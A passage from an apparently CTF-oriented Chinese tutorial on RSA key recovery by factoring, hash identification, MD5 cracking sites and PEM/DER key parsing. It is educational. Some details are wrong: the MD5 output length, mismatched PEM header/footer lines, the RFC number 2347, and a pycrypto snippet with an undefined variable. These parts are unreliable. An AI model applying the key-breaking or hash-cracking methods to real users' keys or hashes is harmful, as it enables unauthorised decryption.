<li>而<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi (N)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>：只有知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，才能算出$ \varphi (N) $</li>
<li>而<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">n=pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span></span></span></span>。只有将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>因数分解，才能算出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></li>
</ol>
<p><strong>如果n可以被因数分解，d就可以算出，也就意味着私钥被破解。</strong></p>
<h3 id="实现-5">实现<a class="header-anchor" href="#实现-5"> ¶ </a></h3>
<h4 id="Java-4">Java<a class="header-anchor" href="#Java-4"> ¶ </a></h4>
<p><strong>java的代码中的private key必须使用pkcs#8格式的</strong></p>
<p>密钥格式：</p>
<ul>
<li>PKCS#8：<code>-----BEGIN PRIVATE KEY-----</code> （JAVA格式）</li>
<li>PKCS#1：<code>-----BEGIN RSA PRIVATE KEY-----</code> （JAVA不支持）</li>
</ul>
<script src="https://gist.github.com/Forgo7ten/0a8e003562f9f2576dcddbfed1b79d77.js"></script>
<p>学习更多</p>
<ul>
<li><a href="https://blog.csdn.net/moakun/article/details/120812061">Java RSA私钥的格式pkcs1和pkcs8、PrivateKey转换_茅坤宝骏氹的博客-CSDN博客</a></li>
</ul>
<h3 id="工具">工具<a class="header-anchor" href="#工具"> ¶ </a></h3>
<h3 id="RSAtool">RSAtool<a class="header-anchor" href="#RSAtool"> ¶ </a></h3>
<ul>
<li>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ius/rsatool.git</span><br><span class="line">cd rsatool</span><br><span class="line">python rsatool.py -h</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>生成私钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="RSA-Converter">RSA Converter<a class="header-anchor" href="#RSA-Converter"> ¶ </a></h4>
<ul>
<li>根据给定密钥对，生成 pem 文件</li>
<li>根据 nn，ee，dd 得出 pp，qq</li>
</ul>
<h4 id="openssl">openssl<a class="header-anchor" href="#openssl"> ¶ </a></h4>
<ul>
<li>
<p>查看公钥文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -in pubkey.pem -text -modulus</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsautl -decrypt -inkey private.pem -in flag.enc -out flag</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>更加具体的细节请参考 <code>openssl --help</code>。</p>
<h4 id="分解整数工具">分解整数工具<a class="header-anchor" href="#分解整数工具"> ¶ </a></h4>
<ul>
<li>
<p>网站分解，<a href="http://factordb.com/">factor.db</a></p>
</li>
<li>
<p>命令行分解，<a href="https://github.com/ryosan-470/factordb-pycli">factordb-pycli</a>，借用 factordb 数据库。</p>
</li>
<li>
<p><a href="https://sourceforge.net/projects/yafu/">yafu</a></p>
<p>使用：</p>
<ol>
<li>进入yafu解压目录，打开cmd命令行</li>
<li>输入<code>yafu-x64</code>（即yafu64位文件名）<br>
命令：<code>factor(n)</code>—— n 为需要分解的大数</li>
</ol>
<p>若n位数过长,将n值保存在文本文档里，最后<strong>一定要有换行符</strong></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">yafu-x64 &quot;factor(@)&quot; -batchfile test.txt</span><br></pre></td></tr></table></figure>
<p>其中<code>test.txt</code>为保存需分解的大质数的文本文档</p>
</li>
</ul>
<h4 id="python库">python库<a class="header-anchor" href="#python库"> ¶ </a></h4>
<h5 id="primefac">primefac<a class="header-anchor" href="#primefac"> ¶ </a></h5>
<p>整数分解库，包含了很多整数分解的算法。</p>
<h5 id="gmpy">gmpy<a class="header-anchor" href="#gmpy"> ¶ </a></h5>
<ul>
<li><code>gmpy.root(a, b)</code>，返回一个元组 <code>(x, y)</code>，其中 <code>x</code> 为 <code>a</code> 开 <code>b</code> 次方的值，<code>y</code> 是判断 <code>x</code> 是否为整数的布尔型变量</li>
</ul>
<h5 id="gmpy2">gmpy2<a class="header-anchor" href="#gmpy2"> ¶ </a></h5>
<p>安装时，可能会需要自己另行安装 mpfr 与 mpc 库。</p>
<ul>
<li><code>gmpy2.iroot(a, b)</code>，类似于 <code>gmpy.root(a,b)</code></li>
</ul>
<blockquote>
<p>安装命令：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install gmpy2</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">E = <span class="number">65537</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">L = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">D = <span class="built_in">int</span>(gmpy2.invert(E, L)) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gmpy2.invert()返回值类型为&lt;class &#x27;mpz&#x27;&gt;</span></span><br><span class="line"><span class="string">invert(x,y)  计算 x 关于1模 y 的乘法逆元</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">enstr = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">destr = gmpy2.powmod(enstr, D, N)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gmpy2.powmod()返回值类型为&lt;class &#x27;mpz&#x27;&gt;</span></span><br><span class="line"><span class="string">gmpy2.powmod(x,y,z)，计算x^y mod z 的值并返回</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">flag0 = <span class="built_in">hex</span>(destr)[<span class="number">2</span>:]     <span class="comment"># flag0类型为str，存的是十六进制表示的字符串</span></span><br><span class="line">flag1 = <span class="built_in">bytes</span>.fromhex(flag0)  <span class="comment"># 将其从十六进制转换为byte类型(此时已解释成字符)</span></span><br><span class="line">flag = <span class="built_in">str</span>(flag1, <span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># 将byte类型转换为str类型</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h5 id="pycrypto">pycrypto<a class="header-anchor" href="#pycrypto"> ¶ </a></h5>
<ul>
<li>
<p>安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip install pycrypto</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>使用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line">msg = <span class="string">&#x27;crypto here&#x27;</span></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = getPrime(<span class="number">64</span>)</span><br><span class="line">pubkey = RSA.construct((long(n), long(e)))</span><br><span class="line">privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))</span><br><span class="line">key = PKCS1_v1_5.new(pubkey)</span><br><span class="line">enc = key.encrypt(msg).encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line">key = PKCS1_v1_5.new(privatekey)</span><br><span class="line">msg = key.decrypt(enc.decode(<span class="string">&#x27;base64&#x27;</span>), e)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="散列算法-哈希函数">散列算法(哈希函数)<a class="header-anchor" href="#散列算法-哈希函数"> ¶ </a></h1>
<p>哈希函数（Hash Function）把消息或数据压缩成摘要，使得数据量变小。其一般模型如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//hash.png" alt="img"></p>
<table>
<thead>
<tr>
<th style="text-align:center">算法类型</th>
<th style="text-align:center">输出 Hash 值长度</th>
<th style="text-align:center">是否有常量表</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">MD5</td>
<td style="text-align:center">128 bit / 256 bit</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">SHA1</td>
<td style="text-align:center">160 bit</td>
<td style="text-align:center">有</td>
</tr>
<tr>
<td style="text-align:center">SHA256</td>
<td style="text-align:center">256 bit</td>
<td style="text-align:center">有</td>
</tr>
<tr>
<td style="text-align:center">SHA512</td>
<td style="text-align:center">512 bit</td>
<td style="text-align:center">有</td>
</tr>
</tbody>
</table>
<h2 id="MD5">MD5<a class="header-anchor" href="#MD5"> ¶ </a></h2>
<p>MD5 的输入输出如下</p>
<ul>
<li>输入：任意长的消息，512 比特长的分组。</li>
<li>输出：128 比特的消息摘要。</li>
</ul>
<p>此外，有时候我们获得到的 md5 是 16 位的，其实那 16 位是 32 位 md5 的长度，是从 32 位 md5 值来的。是将 32 位 md5 去掉前八位，去掉后八位得到的。</p>
<h3 id="特征">特征<a class="header-anchor" href="#特征"> ¶ </a></h3>
<p>一般来说，我们可以通过函数的初始化来判断是不是 MD5 函数。一般来说，如果一个函数有如下四个初始化的变量，可以猜测该函数为 MD5 函数，因为这是 MD5 函数的初始化 IV。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x67452301，0xEFCDAB89，0x98BADCFE，0x10325476</span><br></pre></td></tr></table></figure>
<h3 id="破解-2">破解<a class="header-anchor" href="#破解-2"> ¶ </a></h3>
<p>目前可以说 md5 已经基本被攻破了，一般的 MD5 的碰撞都可以在如下网上获取到</p>
<ul>
<li><a href="http://www.cmd5.com/">http://www.cmd5.com/</a></li>
<li><a href="http://www.ttmd5.com/">http://www.ttmd5.com/</a></li>
<li><a href="http://pmd5.com/">http://pmd5.com/</a></li>
<li><a href="https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip">https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip</a> (生成指定前缀的 md5 碰撞)</li>
</ul>
<h2 id="SHA1">SHA1<a class="header-anchor" href="#SHA1"> ¶ </a></h2>
<p>SHA1 的输入输出如下</p>
<ul>
<li>输入：任意长的消息，分为 <strong>512 比特</strong>长的分组。首先在消息右侧补比特 1，然后再补若干个比特 0，直到消息的比特长度满足对 512 取模后余数是 448，使其与 448 模 512 同余。</li>
<li>输出：160 比特的消息摘要。</li>
</ul>
<p>一般来说，我们可以通过函数的初始化来判断是不是 SHA1 函数。一般来说，如果一个函数有如下五个初始化的变量，可以猜测该函数为 SHA1 函数，因为这是 SHA1 函数的初始化 IV。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x67452301</span><br><span class="line">0xEFCDAB89</span><br><span class="line">0x98BADCFE</span><br><span class="line">0x10325476</span><br><span class="line">0xC3D2E1F0</span><br></pre></td></tr></table></figure>
<p>前面四个与 MD5 类似，后面的是新加的。</p>
<h1 id="证书格式解析">证书格式解析<a class="header-anchor" href="#证书格式解析"> ¶ </a></h1>
<h2 id="PEM格式证书">PEM格式证书<a class="header-anchor" href="#PEM格式证书"> ¶ </a></h2>
<p>PEM 以 <code>-----BEGIN</code> 开头，以 <code>-----END</code> 结尾，中间包含 ASN.1 格式的数据。ASN.1 是经过 base64 转码的二进制数据。</p>
<h3 id="对RSA的pem证书格式解析">对RSA的pem证书格式解析<a class="header-anchor" href="#对RSA的pem证书格式解析"> ¶ </a></h3>
<p>RSA PEM格式通常为如下两种</p>
<p>PKCS#1格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">YG6XRKfkcxnaXGfFDWHL....</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">YG6XRKfkcxnaXGfFDWHL....</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<p>PKCS#8格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">YG6XRKfkcxnaXGfFDWHL....</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">YG6XRKfkcxnaXGfFDWHL....</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>带有PUBLIC的是RSA的公钥，带有PRIVATE的是RSA的私钥。</p>
<p>PKCS#1格式的密钥头部带有RSA，专指RSA的密钥。</p>
<p>PKCS#8格式的密钥则有可能不是RSA的秘钥，而密钥类型在中间的数据中。</p>
<p>中间的数据是Base64格式的。Base64解码后的二进制数据是<code>.der</code>格式证书的内容。<strong>实际上，PEM就是把DER格式的数据用base64编码后，然后再在头尾加上一段“-----”开始的标记而已。</strong></p>
<p>而<code>DER</code>格式是二进制形式，并遵守<a href="https://zh.wikipedia.org/wiki/ASN.1">ASN.1</a>二进制编码格式。<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
<h4 id="PKCS-1格式pem解析">PKCS#1格式pem解析<a class="header-anchor" href="#PKCS-1格式pem解析"> ¶ </a></h4>
<h5 id="私钥">私钥<a class="header-anchor" href="#私钥"> ¶ </a></h5>
<p>首先先利用<a href="https://github.com/ius/rsatool">ius/rsatool: rsatool can be used to calculate RSA and RSA-CRT parameters (github.com)</a>工具生成一个PKCS#1格式的私钥</p>
<p>克隆仓库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ius/rsatool.git</span><br><span class="line"><span class="built_in">cd</span> rsatool</span><br></pre></td></tr></table></figure>
<p>使用前需安装依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m pip install gmpy2</span><br><span class="line">python -m pip install pyasn1</span><br></pre></td></tr></table></figure>
<p>使用命令如下(相应的p、q、e值参考上述例子)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">λ python rsatool.py -f PEM -o private1.pem -p 61 -q 53 -e 17</span><br><span class="line">Using (p, q) to calculate RSA paramaters</span><br><span class="line"></span><br><span class="line">n = 3233 (0xca1)</span><br><span class="line"></span><br><span class="line">e = 17 (0x11)</span><br><span class="line"></span><br><span class="line">d = 2753 (0xac1)</span><br><span class="line"></span><br><span class="line">p = 61 (0x3d)</span><br><span class="line"></span><br><span class="line">q = 53 (0x35)</span><br><span class="line"></span><br><span class="line">Saving PEM as private1.pem</span><br></pre></td></tr></table></figure>
<p>这样就在当前目录生成了格式为PKCS#1的RSA私钥文件<code>private1.pem</code>（Base64每76个字符换一行）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MB0CAQACAgyhAgERAgIKwQIBPQIBNQIBNQIBMQIBJg==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>base64解码后得到二进制数据如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">30 1d 02 01 00 02 02 0c a1 02 01 11 02 02 0a c1 02 01 3d 02 01 35 02 01 35 02 01 31 02 01 26</span><br></pre></td></tr></table></figure>
<p>标准的ASN.1编码规则有<a href="https://zh.wikipedia.org/w/index.php?title=BER&amp;action=edit&amp;redlink=1">基本编码规则</a>（BER，Basic Encoding Rules）、<a href="https://zh.wikipedia.org/w/index.php?title=DER&amp;action=edit&amp;redlink=1">唯一编码规则</a>（DER，Distinguished Encoding Rules）等编码规则。而该格式采用的是DER编码，DER编码格式举例详见：<a href="https://zh.wikipedia.org/wiki/ASN.1#DER%E7%9A%84%E7%B7%A8%E7%A2%BC%E7%AF%84%E4%BE%8B">DER编码范例</a></p>
<p>所以上述解码的字符串也可以解释了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">1</span>d           <span class="comment">// RSAPrivateKey, len=0x1d</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">00</span>      <span class="comment">// version</span></span><br><span class="line">  <span class="number">02</span> <span class="number">02</span> <span class="number">0</span>c a1   <span class="comment">// modulus</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">11</span>      <span class="comment">// publicExponent</span></span><br><span class="line">  <span class="number">02</span> <span class="number">02</span> <span class="number">0</span>a c1   <span class="comment">// privateExponent</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">3</span>d      <span class="comment">// prime1</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">35</span>      <span class="comment">// prime2</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">35</span>      <span class="comment">// exponent1</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">31</span>      <span class="comment">// exponent2</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">26</span>      <span class="comment">// coefficient</span></span><br></pre></td></tr></table></figure>
<p><strong>注意：此处的字节序为大端序</strong></p>
<p>至于内容的格式，可以参考在<a href="https://datatracker.ietf.org/doc/html/rfc2437#section-11.1.2">RFC 2347 RSA私钥ASN.1定义</a></p>
<blockquote>
<p>An RSA private key should be represented with ASN.1 type<br>
RSAPrivateKey:</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAPrivateKey ::= SEQUENCE &#123;</span><br><span class="line">version Version,</span><br><span class="line">modulus INTEGER, -- n</span><br><span class="line">publicExponent INTEGER, -- e</span><br><span class="line">privateExponent INTEGER, -- d</span><br><span class="line">prime1 INTEGER, -- p</span><br><span class="line">prime2 INTEGER, -- q</span><br><span class="line">exponent1 INTEGER, -- d mod (p-1)</span><br><span class="line">exponent2 INTEGER, -- d mod (q-1)</span><br><span class="line">coefficient INTEGER -- (inverse of q) mod p &#125;</span><br><span class="line"></span><br><span class="line">Version ::= INTEGER</span><br></pre></td></tr></table></figure>
<p>The fields of type RSAPrivateKey have the following meanings:</p>
<p>-version is the version number, for compatibility with future<br>
revisions of this document. It shall be 0 for this version of the<br>
document.<br>
-modulus is the modulus n.<br>
-publicExponent is the public exponent e.<br>
-privateExponent is the private exponent d.<br>
-prime1 is the prime factor p of n.<br>
-prime2 is the prime factor q of n.<br>
-exponent1 is d mod (p-1).<br>
-exponent2 is d mod (q-1).<br>
-coefficient is the Chinese Remainder Theorem coefficient q-1 mod p.</p>
</blockquote>
<p>也就正如<code>openssl</code>命令解析的一致了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> private1.pem -text -out private1.txt</span><br></pre></td></tr></table></figure>
<p>内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSA Private-Key: (12 bit, 2 primes)</span><br><span class="line">modulus: 3233 (0xca1)</span><br><span class="line">publicExponent: 17 (0x11)</span><br><span class="line">privateExponent: 2753 (0xac1)</span><br><span class="line">prime1: 61 (0x3d)</span><br><span class="line">prime2: 53 (0x35)</span><br><span class="line">exponent1: 53 (0x35)</span><br><span class="line">exponent2: 49 (0x31)</span><br><span class="line">coefficient: 38 (0x26)</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MB0CAQACAgyhAgERAgIKwQIBPQIBNQIBNQIBMQIBJg==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<h5 id="公钥">公钥<a class="header-anchor" href="#公钥"> ¶ </a></h5>
<p>根据上述私钥，生成公钥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> private1.pem -out public1.pem -RSAPublicKey_out</span><br></pre></td></tr></table></figure>
<p>得到公钥文件<code>public1.pem</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PUBLIC KEY-----</span><br><span class="line">MAcCAgyhAgER</span><br><span class="line">-----END RSA PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<p>Base解码后得到如下，同样是采用<a href="https://zh.wikipedia.org/wiki/ASN.1#DER%E7%9A%84%E7%B7%A8%E7%A2%BC%E7%AF%84%E4%BE%8B">DER编码</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">07</span>           <span class="comment">// PublicKey,len=7</span></span><br><span class="line">  <span class="number">02</span> <span class="number">02</span> <span class="number">0</span>c a1   <span class="comment">// modulus</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">11</span>      <span class="comment">// publicExponent</span></span><br></pre></td></tr></table></figure>
<p>该格式参考的<a href="https://datatracker.ietf.org/doc/html/rfc2437#section-11.1.1">RFC 2347 RSA公钥ASN.1定义</a></p>
<blockquote>
<p>An RSA public key should be represented with the ASN.1 type<br>
RSAPublicKey:</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RSAPublicKey::=SEQUENCE&#123;</span><br><span class="line"> modulus INTEGER, -- n</span><br><span class="line"> publicExponent INTEGER -- e &#125;</span><br></pre></td></tr></table></figure>
<p>(This type is specified in X.509 and is retained here for<br>
compatibility.)</p>
<p>The fields of type RSAPublicKey have the following meanings:<br>
-modulus is the modulus n.<br>
-publicExponent is the public exponent e.</p>
</blockquote>
<p>相较于私钥，公钥部分较为简单，仅有<code>Modulus(N)</code>和<code>Exponent(e)</code>。</p>
<p>于是我们可以解析出相应的信息如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Modulus: 0xca1</span><br><span class="line">Exponent: 0x11</span><br></pre></td></tr></table></figure>
<h4 id="PKCS-8格式pem解析">PKCS#8格式pem解析<a class="header-anchor" href="#PKCS-8格式pem解析"> ¶ </a></h4>
<h5 id="私钥-2">私钥<a class="header-anchor" href="#私钥-2"> ¶ </a></h5>
<p>首先先将上述PKCS#1格式私钥转换为PKCS#8格式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl pkcs8 -topk8 -inform PEM -<span class="keyword">in</span> private1.pem -outform pem -nocrypt -out private8.pem</span><br></pre></td></tr></table></figure>
<p>可以得到如下（Base64每64个字符换一行）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MDMCAQAwDQYJKoZIhvcNAQEBBQAEHzAdAgEAAgIMoQIBEQICCsECAT0CATUCATUC</span><br><span class="line">ATECASY=</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>参考<a href="https://datatracker.ietf.org/doc/html/rfc5208#appendix-A">RFC 5208 - Public-Key Cryptography Standards (PKCS) #8: Private-Key Information Syntax Specification Version 1.2 (ietf.org)</a></p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;PrivateKeyInfo ::= SEQUENCE &#123;</span><br><span class="line">&gt;version Version,</span><br><span class="line">&gt;privateKeyAlgorithm AlgorithmIdentifier &#123;&#123;PrivateKeyAlgorithms&#125;&#125;,</span><br><span class="line">&gt;privateKey PrivateKey,</span><br><span class="line">&gt;attributes [0] Attributes OPTIONAL &#125;</span><br><span class="line"></span><br><span class="line">&gt;Version ::= INTEGER &#123;v1(0)&#125; (v1,...)</span><br><span class="line"></span><br><span class="line">&gt;PrivateKey ::= OCTET STRING</span><br><span class="line"></span><br><span class="line">&gt;Attributes ::= SET OF Attribute</span><br></pre></td></tr></table></figure>
<p>（同时包含Encrypted private-key information syntax）</p>
</blockquote>
<p>可以解析二进制数据位为如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">30</span> <span class="number">33</span></span><br><span class="line">  <span class="number">02</span> <span class="number">01</span> <span class="number">00</span>      <span class="comment">// Version - 0 (v1998)</span></span><br><span class="line">  <span class="number">30</span> <span class="number">0</span>d         <span class="comment">// AlgorithmIdentifier, len=14</span></span><br><span class="line">    <span class="number">06</span> <span class="number">09</span> <span class="number">2</span>a <span class="number">86</span> <span class="number">48</span> <span class="number">86</span> f7 <span class="number">0</span>d <span class="number">01</span> <span class="number">01</span> <span class="number">01</span>    <span class="comment">// 对于RSA该值固定为1.2.840.113549.1.1.1</span></span><br><span class="line">    <span class="number">05</span> <span class="number">00</span>       <span class="comment">// NULL(可选参数)</span></span><br><span class="line">  <span class="number">04</span> <span class="number">1f</span>             <span class="comment">// PrivateKey, len=0x1f</span></span><br><span class="line">    <span class="number">30</span> <span class="number">1</span>d           <span class="comment">// RSAPrivateKey, len=0x1d</span></span><br><span class="line">      <span class="number">02</span> <span class="number">01</span> <span class="number">00</span>      <span class="comment">// version</span></span><br><span class="line">      <span class="number">02</span> <span class="number">02</span> <span class="number">0</span>c a1   <span class="comment">// modulus</span></span><br><span class="line">      <span class="number">02</span> <span class="number">01</span> <span class="number">11</span>      <span class="comment">// publicExponent</span></span><br><span class="line">      <span class="number">02</span> <span class="number">02</span> <span class="number">0</span>a c1   <span class="comment">// privateExponent</span></span><br><span class="line">      <span class="number">02</span> <span class="number">01</span> <span class="number">3</span>d      <span class="comment">// prime1</span></span><br><span class="line">      <span class="number">02</span> <span class="number">01</span> <span class="number">35</span>      <span class="comment">// prime2</span></span><br><span class="line">      <span class="number">02</span> <span class="number">01</span> <span class="number">35</span>      <span class="comment">// exponent1</span></span><br><span class="line">      <span class="number">02</span> <span class="number">01</span> <span class="number">31</span>      <span class="comment">// 